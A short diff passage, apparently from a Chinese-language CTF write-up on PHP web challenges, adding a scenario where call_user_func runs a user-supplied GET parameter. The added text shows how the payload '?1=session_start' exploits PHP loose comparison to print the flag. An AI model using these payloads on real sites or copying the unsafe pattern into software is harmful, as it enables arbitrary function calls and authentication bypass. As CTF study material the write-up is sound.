@@ -346,5 +346,15 @@ Payload：?f1=_&f2=get_defined_vars
 Cookie: PHPSESSID=372619038;
 ```
 
-
+场景2：
+```
+$key=call_user_func(($_GET[1]));
+if($key=="HappyNewYear"){
+echo $flag;
+}
+```
+这里是两个==字符串，php中true==字符串，只需要传递一个函数运行后是返回true
+```
+如：?1=session_start
+```
 
